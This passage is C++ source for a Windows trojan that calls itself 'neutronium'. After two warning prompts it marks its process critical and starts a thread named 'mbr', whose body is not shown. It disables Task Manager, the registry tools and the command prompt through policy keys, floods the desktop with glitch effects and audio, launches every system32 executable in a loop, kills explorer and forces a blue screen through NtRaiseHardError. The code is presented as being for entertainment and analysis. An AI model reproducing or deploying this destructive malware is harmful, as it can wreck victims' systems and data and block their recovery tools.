    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t + ((t >> 11) ^ (t >> 4)) | t & t >> 11);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 17000, 17000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[17000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t ^ ((t * (t ^ 14)) >> 7));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t ^ (t >> 11) & 45) % 282);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * (sin(t >> 5 | t >> 9) * 3.6)));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound10() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ((t | (t << 11))) & ((t | (t >> 6)) * (t & (t >> 8))));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound11() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(4 * t | t * ((t >> 2) | (t >> 4)));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound12() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 11 & t >> 1) | ((t & t * 5) | (t & t >> 14)));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound13() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t << 2 ^ t >> 6) | (t << 3 * t >> 6);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound14() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 5 & t >> 12) * (t >> 4 | t >> 5) | (t >> 6 & t >> 11) | t << 15 * rand());

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound15() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t / (3 + (t >> 10 & t)) & 1) ? 128 : 1);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound16() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t / 11) | (t / 9)) + (t >> 1);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound17() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((int)(tan(t >> 2 | t >> 11) * 256) | t << t));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound18() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t >> 9) & ((t + 5) / 4) + t | t >> (((t >> 18) & (t >> 5))) ^ (t >> 8 | t >> 4)));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound19() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(11 * (t + (t >> 4) & 5) | (t >> 9));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound20() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> t | t << t | t * rand());

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI cur(LPVOID lpParam) {
    while (true) {
        POINT cpt;
        GetCursorPos(&cpt);
        int x = cpt.x, y = cpt.y;
        SetCursorPos(x + rand() % 2 + rand() % 2, y + rand() % 2 + rand() % 2);
        Sleep(10);
        SetCursorPos(x - rand() % 2 + rand() % 2, y - rand() % 2 + rand() % 2);
        Sleep(10);
    }
}

DWORD WINAPI fake(LPVOID lpParam) {
    MessageBoxA(NULL, "Local Disk (C:\\) is NOT accessible, access denied.", "neutronium", MB_ICONERROR);
    return 0;
}

DWORD WINAPI opener(LPVOID lpParam) {
    WIN32_FIND_DATA data;
    LPCWSTR path = L"C:\\WINDOWS\\system32\\*.exe";
    while (true) {
        HANDLE find = FindFirstFileW(path, &data);
        ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
        while (FindNextFileW(find, &data)) {
            ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
            Sleep(rand() % 5000);
        }
    }
}

DWORD WINAPI cur1(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        SetCursorPos(rand() % w, rand() % h);
        Sleep(10);
    }
}

DWORD WINAPI resize(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        SetWindowPos(GetForegroundWindow(), 0, rand() % w, rand() % h, rand() % w, rand() % h, 0);
        Sleep(500);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI textz(LPVOID lpParam) {
    while (true) {
        BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
        EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
        Sleep(10);
    }
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
    SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)string(), SMTO_ABORTIFHUNG, 100, NULL);
    return true;
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
    if (MessageBoxW(NULL, L"Warning! You have ran a trojan known as neutronium that has full capacity to delete all of your data and your operating system. By continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it's highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis. Are you sure you want to run this?", L"neutronium", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
    else {
        if (MessageBoxW(NULL, L"Final warning! This trojan has a lot of destructive potential. You will lose all of your data if you continue and the creator will not be responsible for any of the damage caused. This is not meant to be malicious, but simply for entertainment and educational purposes. Are you sure you want to continue? This is your final chance to stop this program from execution.", L"neutronium", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
            ExitProcess(0);
        }
        else {
            ProcessIsCritical();
            CreateThread(0, 0, mbr, 0, 0, 0);
            CreateThread(0, 0, fake, 0, 0, 0);
            RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
            RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
            RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
            Sleep(5000);
            CreateThread(0, 0, cur, 0, 0, 0);
            HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
            sound1();
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
            HANDLE thread2dot1 = CreateThread(0, 0, icocur, 0, 0, 0);
            sound2();
            Sleep(30000);
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread3 = CreateThread(0, 0, shader3, 0, 0, 0);
            HANDLE thread3dot1 = CreateThread(0, 0, wef, 0, 0, 0);
            sound3();
            Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread4 = CreateThread(0, 0, blur, 0, 0, 0);
            HANDLE thread4dot1 = CreateThread(0, 0, wave, 0, 0, 0);
            HANDLE thread4dot2 = CreateThread(0, 0, shader4, 0, 0, 0);
            sound4();
            Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            TerminateThread(thread4dot1, 0);
            CloseHandle(thread4dot1);
            TerminateThread(thread4dot2, 0);
            CloseHandle(thread4dot2);
            TerminateThread(thread3dot1, 0);
            CloseHandle(thread3dot1);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread5 = CreateThread(0, 0, shader5, 0, 0, 0);
            sound5();
            Sleep(30000);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread6 = CreateThread(0, 0, shader6, 0, 0, 0);
            sound6();
            Sleep(30000);
            TerminateThread(thread6, 0);
            CloseHandle(thread6);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread7 = CreateThread(0, 0, shader7, 0, 0, 0);
            HANDLE thread7dot1 = CreateThread(0, 0, blur1, 0, 0, 0);
            HANDLE thread7dot2 = CreateThread(0, 0, cube, 0, 0, 0);
            sound7();
            Sleep(30000);
            TerminateThread(thread7, 0);
            CloseHandle(thread7);
            TerminateThread(thread7dot1, 0);
            CloseHandle(thread7dot1);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread8 = CreateThread(0, 0, shader8, 0, 0, 0);
            sound8();
            Sleep(30000);
            TerminateThread(thread8, 0);
            CloseHandle(thread8);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread9 = CreateThread(0, 0, shader9, 0, 0, 0);
            sound9();
            Sleep(30000);
            TerminateThread(thread9, 0);
            CloseHandle(thread9);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread10 = CreateThread(0, 0, shader10, 0, 0, 0);
            HANDLE thread10dot1 = CreateThread(0, 0, pixels, 0, 0, 0);
            sound10();
            Sleep(30000);
            TerminateThread(thread10, 0);
            CloseHandle(thread10);
            TerminateThread(thread10dot1, 0);
            CloseHandle(thread10dot1);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            CreateThread(0, 0, opener, 0, 0, 0);
            CreateThread(0, 0, cur1, 0, 0, 0);
            CreateThread(0, 0, resize, 0, 0, 0);
            CreateThread(0, 0, textz, 0, 0, 0);
            HANDLE thread11 = CreateThread(0, 0, pathell, 0, 0, 0);
            HANDLE thread11dot1 = CreateThread(0, 0, textout, 0, 0, 0);
            sound11();
            Sleep(30000);
            TerminateThread(thread11, 0);
            CloseHandle(thread11);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread12 = CreateThread(0, 0, shader11, 0, 0, 0);
            sound12();
            Sleep(30000);
            TerminateThread(thread12, 0);
            CloseHandle(thread12);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread13 = CreateThread(0, 0, shader12, 0, 0, 0);
            sound13();
            Sleep(30000);
            TerminateThread(thread13, 0);
            CloseHandle(thread13);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread14 = CreateThread(0, 0, shader13, 0, 0, 0);
            sound14();
            Sleep(30000);
            TerminateThread(thread14, 0);
            CloseHandle(thread14);
            TerminateThread(thread7dot2, 0);
            CloseHandle(thread7dot2);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread15 = CreateThread(0, 0, shader14, 0, 0, 0);
            HANDLE thread15dot1 = CreateThread(0, 0, screen, 0, 0, 0);
            HANDLE thread15dot2 = CreateThread(0, 0, wef, 0, 0, 0);
            sound15();
            Sleep(30000);
            TerminateThread(thread15, 0);
            CloseHandle(thread15);
            TerminateThread(thread15dot1, 0);
            CloseHandle(thread15dot1);
            TerminateThread(thread15dot2, 0);
            CloseHandle(thread15dot2);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread16 = CreateThread(0, 0, shader15, 0, 0, 0);
            sound16();
            Sleep(30000);
            TerminateThread(thread16, 0);
            CloseHandle(thread16);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread17 = CreateThread(0, 0, shader16, 0, 0, 0);
            sound17();
            Sleep(30000);
            TerminateThread(thread17, 0);
            CloseHandle(thread17);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread18 = CreateThread(0, 0, shader17, 0, 0, 0);
            sound18();
            Sleep(30000);
            TerminateThread(thread18, 0);
            CloseHandle(thread18);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread19 = CreateThread(0, 0, shader18, 0, 0, 0);
            sound19();
            Sleep(30000);
            TerminateThread(thread19, 0);
            CloseHandle(thread19);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            ShellExecuteA(NULL, NULL, "taskkill", "/f /im explorer.exe", NULL, SW_SHOWDEFAULT);
            HANDLE thread20 = CreateThread(0, 0, shader19, 0, 0, 0);
            sound20();
            Sleep(30000);
            BOOLEAN bl;
            DWORD response;
            NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
            RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
            RtlAdjustPrivilege(19, 1, 0, &bl);
            NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
            Sleep(-1);
        }
    }
}